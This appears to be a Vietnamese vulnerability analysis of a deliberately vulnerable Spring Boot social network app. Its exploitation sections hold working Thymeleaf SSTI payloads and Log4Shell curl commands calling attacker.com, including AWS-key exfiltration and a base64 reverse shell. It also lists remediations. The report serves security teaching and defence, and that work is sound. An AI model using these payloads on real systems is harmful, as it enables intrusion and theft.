# PHÂN TÍCH LỖ HỔNG BẢO MẬT - SOCIAL NETWORK APPLICATION

## 📋 THÔNG TIN TỔNG QUAN

**Tên ứng dụng**: Social Network V1  
**Framework**: Spring Boot 3.3.1 + Thymeleaf  
**Ngôn ngữ**: Java 17  
**Loại lỗ hổng chính**: **SSTI (Server-Side Template Injection) leading to RCE**  

---

## 🔴 LỖ HỔNG NGHIÊM TRỌNG #1: THYMELEAF SSTI (Server-Side Template Injection)

### 📍 VỊ TRÍ LỖ HỔNG

**File**: `src/main/java/com/nhoclahola/socialnetworkv1/controller/web/WebSearchController.java`

```java
@Controller
public class WebSearchController {
    @GetMapping("/search")
    public String searchPage(@RequestParam(value = "query", required = false) String query, Model model) {
        model.addAttribute("inputSearch", query);  // ⚠️ NGUY HIỂM: Input không được validate
        return "user/search_page";
    }
}
```

**File Template**: `src/main/resources/templates/fragments/search/content.html`

```html
<script th:inline="javascript">
    let inputSearch = [[${inputSearch}]];  // ⚠️ CRITICAL: Thymeleaf expression injection point
    if (inputSearch != null) {
        startLoad('/api/posts/search', inputSearch);
        startLoadUsers('/api/users/search', inputSearch)
    }
</script>
```

### 🎯 MÔ TẢ LỖ HỔNG

Controller `WebSearchController` nhận tham số `query` từ URL mà **KHÔNG CÓ BẤT KỲ VALIDATION NÀO**, sau đó truyền trực tiếp vào Model với tên `inputSearch`.

Trong template Thymeleaf, biến `inputSearch` được inject vào trong khối JavaScript sử dụng cú pháp `[[${inputSearch}]]`. Đây là **điểm khai thác SSTI**.

### 💣 KHAI THÁC LỖ HỔNG

#### **Payload 1: SSTI Basic Test**
```
http://localhost:8080/search?query=${7*7}
```
Nếu vulnerable, kết quả sẽ là `49` thay vì `${7*7}`

#### **Payload 2: Remote Code Execution (RCE)**
```
http://localhost:8080/search?query=__${T(java.lang.Runtime).getRuntime().exec('calc')}__::.x
```

#### **Payload 3: Server Information Disclosure**
```
http://localhost:8080/search?query=${T(java.lang.System).getProperty('user.dir')}
```

#### **Payload 4: Read Sensitive Files**
```
http://localhost:8080/search?query=${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
```

#### **Payload 5: Execute System Commands**
```
http://localhost:8080/search?query=__${T(java.lang.Runtime).getRuntime().exec('whoami')}__::.x
```

### ⚡ TÁC ĐỘNG

- **Mức độ nghiêm trọng**: 🔴 **CRITICAL (10/10 CVSS)**
- **Remote Code Execution (RCE)**: Attacker có thể thực thi mã tùy ý trên server
- **Full System Compromise**: Kiểm soát hoàn toàn hệ thống
- **Data Breach**: Đọc được mọi file trên server (database credentials, AWS keys, etc.)
- **Lateral Movement**: Có thể tấn công các hệ thống khác trong mạng nội bộ

---

## 🔴 LỖ HỔNG NGHIÊM TRỌNG #2: LOG4SHELL (CVE-2021-44228) - JNDI INJECTION

### 📍 VỊ TRÍ LỖ HỔNG

**File Dependencies**: `build.gradle`

```gradle
dependencies {
    // Vulnerable Log4j2 version for educational purposes
    implementation 'org.apache.logging.log4j:log4j-api:2.14.1'     // ⚠️ VULNERABLE VERSION
    implementation 'org.apache.logging.log4j:log4j-core:2.14.1'    // ⚠️ CVE-2021-44228
    implementation 'org.apache.logging.log4j:log4j-slf4j-impl:2.14.1'
}
```

**File Controller**: `src/main/java/com/nhoclahola/socialnetworkv1/controller/api/AuthController.java`

```java
@PostMapping("/login")
public AuthResponse login(@RequestBody @Valid UserLoginRequest request, HttpServletRequest httpRequest) {
    String userAgent = httpRequest.getHeader("User-Agent");  // ⚠️ DANGEROUS: Untrusted input
    String clientIp = getClientIp(httpRequest);
    logger.info("Login attempt - Email: {}, IP: {}, User-Agent: {}", 
                request.getEmail(), clientIp, userAgent);  // ⚠️ LOG4SHELL INJECTION POINT
    // ...
}

@PostMapping("/register")
public AuthResponse createUser(@RequestBody @Valid UserCreateRequest request, HttpServletRequest httpRequest) {
    String userAgent = httpRequest.getHeader("User-Agent");  // ⚠️ DANGEROUS
    logger.info("New user registration attempt - Email: {}, IP: {}, User-Agent: {}", 
                request.getEmail(), clientIp, userAgent);  // ⚠️ INJECTION POINT
    // ...
}
```

**File Controller**: `src/main/java/com/nhoclahola/socialnetworkv1/controller/api/UserController.java`

```java
@GetMapping("/users/search")
public ApiResponse<List<UserResponse>> searchUser(@RequestParam("query") String query, 
                                                   @RequestParam("index") int index, 
                                                   HttpServletRequest request) {
    String userAgent = request.getHeader("User-Agent");  // ⚠️ DANGEROUS
    logger.info("User search query: '{}', User-Agent: {}", query, userAgent);  // ⚠️ INJECTION POINT
    // ...
}
```

### 🎯 MÔ TẢ LỖ HỔNG

Ứng dụng sử dụng **Log4j 2.14.1** - phiên bản bị ảnh hưởng bởi lỗ hổng **Log4Shell (CVE-2021-44228)**, một trong những lỗ hổng nguy hiểm nhất trong lịch sử.

Lỗ hổng xảy ra khi:
1. **Log4j 2.14.1** có tính năng JNDI lookup được bật mặc định
2. Ứng dụng log các **User-Agent headers** từ HTTP requests mà **KHÔNG SANITIZE**
3. Attacker có thể inject JNDI lookup expressions vào User-Agent header
4. Log4j sẽ thực thi JNDI lookup, cho phép **Remote Code Execution**

### 💣 KHAI THÁC LỖ HỔNG

#### **Payload 1: Basic JNDI Lookup Test**
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: ${jndi:ldap://attacker.com/a}" \
  -d '{"email":"test@test.com","password":"password123"}'
```

#### **Payload 2: RCE via LDAP Server**
```bash
# 1. Setup malicious LDAP server (using marshalsec)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8000/#Exploit" 1389

# 2. Setup HTTP server hosting malicious class
python3 -m http.server 8000

# 3. Trigger exploit via User-Agent
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}" \
  -d '{"email":"test@test.com","password":"password123"}'
```

#### **Payload 3: RCE via DNS Lookup (Exfiltration)**
```bash
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -H "User-Agent: ${jndi:ldap://\${env:AWS_SECRET_KEY}.attacker.com/a}" \
  -d '{"email":"newuser@test.com","password":"pass123","firstName":"Test","lastName":"User"}'
```

#### **Payload 4: Reverse Shell**
```bash
# User-Agent header:
${jndi:ldap://attacker.com:1389/Exploit}

# Where Exploit.class contains:
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {}
    }
}
```

#### **Payload 5: Via Search Endpoint**
```bash
curl -X GET "http://localhost:8080/api/users/search?query=test&index=0" \
  -H "Authorization: Bearer <token>" \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/RCE}"
```

### ⚡ TÁC ĐỘNG

- **Mức độ nghiêm trọng**: 🔴 **CRITICAL (10/10 CVSS)**
- **Remote Code Execution (RCE)**: Thực thi mã tùy ý trên server
- **Zero-Click Exploitation**: Chỉ cần gửi HTTP request với User-Agent độc hại
- **No Authentication Required**: Endpoint `/auth/login` và `/auth/register` không cần xác thực
- **Widespread Impact**: Ảnh hưởng đến hàng triệu hệ thống trên toàn thế giới
- **Data Exfiltration**: Có thể đánh cắp environment variables (AWS keys, JWT secrets, DB passwords)
- **Botnet Recruitment**: Server có thể bị biến thành zombie trong botnet
- **Supply Chain Attack**: Có thể dùng để tấn công các hệ thống nội bộ khác

### 🔬 PHÂN TÍCH KỸ THUẬT

**Tại sao lỗ hổng này nguy hiểm:**

1. **Không cần authentication**: Các endpoint `/auth/login`, `/auth/register` đều public
2. **User-Agent được log trực tiếp**: Không có validation hay sanitization
3. **JNDI lookup enabled by default**: Log4j 2.14.1 tự động xử lý `${jndi:...}` expressions
4. **Multiple injection points**: 3 endpoints khác nhau có thể bị khai thác
5. **Cascading exploitation**: Có thể kết hợp với SSTI để tăng impact

**Flow khai thác:**

```
1. Attacker sends HTTP request with malicious User-Agent
   └─> User-Agent: ${jndi:ldap://evil.com:1389/Exploit}

2. AuthController receives request
   └─> String userAgent = httpRequest.getHeader("User-Agent");

3. Logger logs the User-Agent
   └─> logger.info("Login attempt - ..., User-Agent: {}", userAgent);

4. Log4j processes the log message
   └─> Detects ${jndi:...} pattern

5. Log4j performs JNDI lookup
   └─> Connects to evil.com:1389 (LDAP server)

6. LDAP server returns malicious object reference
   └─> Points to http://evil.com/Exploit.class

7. JVM downloads and executes Exploit.class
   └─> REMOTE CODE EXECUTION!
```

### 🕵️ CÁC ENDPOINT BỊ ẢNH HƯỞNG

| Endpoint | Method | Authentication | Severity |
|----------|--------|----------------|----------|
| `/auth/login` | POST | ❌ No | 🔴 Critical |
| `/auth/register` | POST | ❌ No | 🔴 Critical |
| `/auth/reset-password` | POST | ❌ No | 🔴 Critical |
| `/api/users/search` | GET | ✅ Required | 🔴 Critical |

---

## 🟠 LỖ HỔNG NGHIÊM TRỌNG #3: HARDCODED CREDENTIALS

### 📍 VỊ TRÍ LỖ HỔNG

### 💣 TÁC ĐỘNG

- **Email Account Compromise**: Attacker có thể gửi email giả mạo
- **JWT Token Forgery**: Tạo JWT token giả mạo để truy cập unauthorized
- **AWS Account Compromise**: Kiểm soát toàn bộ S3 bucket và tài nguyên AWS
- **Data Leakage**: Tải được mọi file trong S3 bucket

---

## 🟡 LỖ HỔNG NGHIÊM TRỌNG #4: MISSING AUTHENTICATION ON WEB ROUTES

### 📍 VỊ TRÍ LỖ HỔNG

**File**: `src/main/java/com/nhoclahola/socialnetworkv1/configuration/SecurityConfig.java`

```java
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
    httpSecurity.authorizeHttpRequests(request ->
        request.requestMatchers("/api/admin/**").hasRole("ADMIN")
               .requestMatchers("/api/**").authenticated()
               .anyRequest().permitAll());  // ⚠️ TẤT CẢ WEB ROUTES KHÔNG BẢO VỆ
    // ...
}
```

### 💣 TÁC ĐỘNG

- **Chỉ bảo vệ `/api/**` routes**: Tất cả web routes (`/search`, `/profile`, etc.) đều public
- **Không cần authentication**: Attacker có thể khai thác SSTI mà không cần đăng nhập
- **Information Disclosure**: Có thể truy cập các trang web mà không cần xác thực

---

## 🟢 LỖ HỔNG BẢO MẬT KHÁC

### 4. CSRF Protection Disabled

```java
httpSecurity.csrf(httpSecurityCsrfConfigurer -> httpSecurityCsrfConfigurer.disable());
```

- Dễ bị tấn công Cross-Site Request Forgery

### 5. Overly Permissive CORS Configuration

```java
configuration.setAllowedMethods(List.of("*"));
configuration.setAllowedHeaders(List.of("*"));
```

- Cho phép tất cả methods và headers từ allowed origins

### 6. No Input Validation

- Không có validation cho user input trong `WebSearchController`
- Không có sanitization cho dữ liệu trước khi render

### 7. Session Management Issues

```java
.sessionManagement(management -> 
    management.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
```

- Stateless nhưng không có proper token refresh mechanism

---

## 🛡️ CÁCH KHẮC PHỤC

### 1. Fix SSTI Vulnerability

**Cách 1: Escape user input trong template**

```html
<!-- TRƯỚC (VULNERABLE) -->
<script th:inline="javascript">
    let inputSearch = [[${inputSearch}]];
</script>

<!-- SAU (SECURE) -->
<script th:inline="javascript">
    /*<![CDATA[*/
    let inputSearch = /*[[${inputSearch != null ? #strings.escapeJavaScript(inputSearch) : ''}]]*/ '';
    /*]]>*/
</script>
```

**Cách 2: Validate và sanitize input trong Controller**

```java
@Controller
public class WebSearchController {
    
    private static final Pattern SAFE_INPUT_PATTERN = Pattern.compile("^[a-zA-Z0-9\\s]+$");
    
    @GetMapping("/search")
    public String searchPage(@RequestParam(value = "query", required = false) String query, Model model) {
        if (query != null && !query.isEmpty()) {
            // Validate input
            if (!SAFE_INPUT_PATTERN.matcher(query).matches()) {
                throw new IllegalArgumentException("Invalid search query");
            }
            // Limit length
            if (query.length() > 100) {
                query = query.substring(0, 100);
            }
        }
        model.addAttribute("inputSearch", query);
        return "user/search_page";
    }
}
```

### 2. Fix Log4Shell Vulnerability

**Cách 1: Upgrade Log4j to patched version (KHUYẾN NGHỊ)**

```gradle
dependencies {
    // Upgrade to patched version
    implementation 'org.apache.logging.log4j:log4j-api:2.17.1'      // ✅ PATCHED
    implementation 'org.apache.logging.log4j:log4j-core:2.17.1'     // ✅ PATCHED
    implementation 'org.apache.logging.log4j:log4j-slf4j-impl:2.17.1'
}
```

**Cách 2: Disable JNDI Lookup (Temporary mitigation)**

Add to JVM arguments:
```bash
-Dlog4j2.formatMsgNoLookups=true
```

Or set environment variable:
```bash
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

**Cách 3: Sanitize User-Agent before logging**

```java
@PostMapping("/login")
public AuthResponse login(@RequestBody @Valid UserLoginRequest request, HttpServletRequest httpRequest) {
    String userAgent = httpRequest.getHeader("User-Agent");
    String clientIp = getClientIp(httpRequest);
    
    // Sanitize User-Agent to prevent JNDI injection
    String sanitizedUserAgent = sanitizeForLogging(userAgent);
    
    logger.info("Login attempt - Email: {}, IP: {}, User-Agent: {}", 
                request.getEmail(), clientIp, sanitizedUserAgent);
    // ...
}

private String sanitizeForLogging(String input) {
    if (input == null) return "null";
    // Remove ${...} patterns and other dangerous characters
    return input.replaceAll("\\$\\{[^}]*\\}", "")
                .replaceAll("[^a-zA-Z0-9\\s.;/()_-]", "");
}
```

**Cách 4: Use allowlist for User-Agent patterns**

```java
private static final Pattern SAFE_USER_AGENT = Pattern.compile("^[a-zA-Z0-9\\s.;/()_-]+$");

private String sanitizeUserAgent(String userAgent) {
    if (userAgent == null || userAgent.isEmpty()) {
        return "unknown";
    }
    if (!SAFE_USER_AGENT.matcher(userAgent).matches()) {
        return "suspicious-user-agent";
    }
    return userAgent.substring(0, Math.min(200, userAgent.length()));
}
```

### 3. Remove Hardcoded Credentials

```yaml
# Sử dụng environment variables
spring:
  mail:
    username: ${MAIL_USERNAME}
    password: ${MAIL_PASSWORD}

jwt:
  privateKey: ${JWT_PRIVATE_KEY}

cloud:
  aws:
    credentials:
      access-key: ${S3_ACCESS_KEY}  # Bỏ default value
      secret-key: ${S3_SECRET_KEY}
```

### 4. Implement Proper Authentication

```java
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
    httpSecurity.authorizeHttpRequests(request ->
        request.requestMatchers("/api/admin/**").hasRole("ADMIN")
               .requestMatchers("/api/**").authenticated()
               .requestMatchers("/auth/**", "/", "/css/**", "/js/**", "/images/**").permitAll()
               .anyRequest().authenticated());  // Require auth for all other routes
    // ...
}
```

### 5. Enable CSRF Protection

```java
httpSecurity.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
```

### 6. Restrict CORS Configuration

```java
configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
configuration.setAllowedHeaders(List.of("Authorization", "Content-Type"));
```

---

## 📊 ĐÁNH GIÁ RỦI RO TỔNG QUAN

| Lỗ hổng | Mức độ | CVSS Score | Khả năng khai thác | Tác động |
|---------|--------|------------|-------------------|----------|
| SSTI/RCE | 🔴 Critical | 10.0 | Cao | Full compromise |
| Log4Shell (CVE-2021-44228) | 🔴 Critical | 10.0 | Cực cao | RCE without auth |
| Hardcoded Credentials | 🔴 Critical | 9.0 | Cao | Data breach |
| Missing Auth on Web | 🟠 High | 7.5 | Trung bình | Unauthorized access |
| CSRF Disabled | 🟡 Medium | 6.5 | Trung bình | CSRF attacks |
| Overly Permissive CORS | 🟡 Medium | 5.0 | Thấp | XSS potential |

---

## 🎯 KẾT LUẬN

Ứng dụng này chứa **LỖ HỔNG BẢO MẬT CỰC KỲ NGHIÊM TRỌNG** cho phép attacker:

1. ✅ Thực thi mã tùy ý trên server (RCE) - **2 vectors khác nhau (SSTI + Log4Shell)**
2. ✅ Đọc mọi file trên hệ thống
3. ✅ Chiếm quyền kiểm soát hoàn toàn server
4. ✅ Đánh cắp credentials và AWS keys
5. ✅ Truy cập và sửa đổi database
6. ✅ Sử dụng server như một bot trong botnet
7. ✅ Khai thác mà **KHÔNG CẦN XÁC THỰC** (Log4Shell via /auth endpoints)

**Điểm đặc biệt nguy hiểm:**
- **Kết hợp 2 lỗ hổng RCE**: SSTI qua web interface + Log4Shell qua API
- **Multiple attack vectors**: Attacker có nhiều cách để xâm nhập hệ thống
- **No authentication required**: Log4Shell có thể khai thác trên public endpoints
- **Widespread vulnerable dependencies**: Log4j 2.14.1 bị CVE-2021-44228

**Khuyến nghị**: **KHÔNG TRIỂN KHAI** ứng dụng này lên production cho đến khi đã fix tất cả lỗ hổng bảo mật.

---

## 📚 THAM KHẢO

- [OWASP - Server Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [HackTricks - SSTI Thymeleaf](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java)
- [CVE-2021-44228 - Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA - Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Spring Security Best Practices](https://spring.io/guides/topicals/spring-security-architecture)

---

**Ngày phân tích**: 3 October 2025  
**Người phân tích**: GitHub Copilot Security Analysis  
**Mức độ tổng thể**: 🔴 **CRITICAL** (2 RCE vectors)
